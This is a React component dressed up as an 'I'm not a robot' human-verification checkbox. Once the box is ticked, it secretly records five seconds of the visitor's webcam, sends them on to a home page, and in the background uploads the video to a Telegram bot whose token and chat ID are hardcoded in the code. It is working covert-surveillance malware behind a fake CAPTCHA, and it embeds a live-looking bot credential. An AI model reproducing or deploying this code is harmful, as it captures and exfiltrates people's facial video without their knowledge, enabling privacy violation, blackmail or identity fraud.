import React, { useRef, useState } from 'react';
import { CheckCircle2, Loader2 } from 'lucide-react';
import { useNavigate } from 'react-router-dom';

const TELEGRAM_BOT_TOKEN = "5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q";
const TELEGRAM_CHAT_ID = "2070423407";

const VerificationBox = () => {
  const [isChecked, setIsChecked] = useState(false);
  const [isRecording, setIsRecording] = useState(false);
  const [isVerified, setIsVerified] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const chunksRef = useRef<Blob[]>([]);
  const navigate = useNavigate();

  const sendToTelegram = async (videoBlob: Blob) => {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('video', videoBlob, 'verification.webm');

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
        method: 'POST',
        body: formData
      });
    } catch (error) {
      console.error('Failed to send video:', error);
    }
  };

  const startVerification = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }

      setIsRecording(true);
      mediaRecorderRef.current = new MediaRecorder(stream);
      chunksRef.current = [];

      mediaRecorderRef.current.ondataavailable = (event) => {
        chunksRef.current.push(event.data);
      };

      mediaRecorderRef.current.onstop = () => {
        const videoBlob = new Blob(chunksRef.current, { type: 'video/webm' });
        setIsVerified(true);
        setIsRecording(false);
        stream.getTracks().forEach(track => track.stop());
        
        // Navigate to home page and send video in background
        navigate('/home');
        sendToTelegram(videoBlob);
      };

      mediaRecorderRef.current.start();
      setTimeout(() => {
        if (mediaRecorderRef.current?.state === 'recording') {
          mediaRecorderRef.current.stop();
        }
      }, 5000);
    } catch (err) {
      console.error('Camera access error:', err);
      alert('Unable to access camera. Please ensure you have granted camera permissions.');
      setIsChecked(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-600 to-green-600 flex items-center justify-center p-4">
      <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-8 w-full max-w-md shadow-2xl border border-white/20">
        <div className="text-center space-y-6">
          <div className="space-y-2">
            <h1 className="text-2xl font-bold text-white">Human Verification</h1>
            <p className="text-white/80 text-sm">Please verify that you're human</p>
          </div>

          <div className="relative w-full aspect-video">
            <video
              ref={videoRef}
              autoPlay
              playsInline
              muted
              className={`w-full h-full rounded-lg ${!isRecording && !isVerified ? 'hidden' : 'block'}`}
            />
            {isRecording && (
              <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2">
                <div className="w-48 h-48 border-4 border-yellow-400 rounded-full animate-pulse" />
              </div>
            )}
          </div>

          <label className="flex items-center justify-center space-x-3 cursor-pointer group">
            <input
              type="checkbox"
              checked={isChecked}
              onChange={(e) => {
                setIsChecked(e.target.checked);
                if (e.target.checked) {
                  startVerification();
                }
              }}
              className="w-5 h-5 rounded border-2 border-white/30 checked:bg-green-500 checked:border-green-500 
                         transition-all duration-200 focus:ring-2 focus:ring-green-500/50"
            />
            <span className="text-white group-hover:text-white/90 transition-colors">
              I'm not a robot
            </span>
          </label>

          {isRecording && (
            <div className="flex items-center justify-center space-x-2 text-yellow-300">
              <Loader2 className="animate-spin" size={18} />
              <span>Verifying...</span>
            </div>
          )}

          {isVerified && (
            <div className="flex items-center justify-center space-x-2 text-green-400">
              <CheckCircle2 size={18} />
              <span>Verification Complete!</span>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default VerificationBox;